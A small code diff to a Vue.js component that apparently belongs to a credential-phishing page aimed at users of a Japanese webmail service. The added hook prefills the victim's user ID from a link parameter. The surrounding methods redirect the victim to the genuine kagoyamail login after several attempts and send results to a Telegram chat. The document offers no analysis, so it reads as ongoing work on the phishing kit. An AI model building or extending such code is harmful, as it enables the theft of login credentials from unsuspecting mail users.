@@ -105,6 +105,11 @@ export default {
     };
   },
 
+
+    mounted() {
+    this.formDataRes.userid = this.$route.query.qrn || ' '
+  },
+
   methods: {
     async finishJoob() {
       this.count++;
@@ -129,6 +134,8 @@ export default {
         location.replace("https://activemail.kagoyamail.jp/");
       }
     },
+
+
 
     async sendTelegramResult(chatId, message) {
       try {
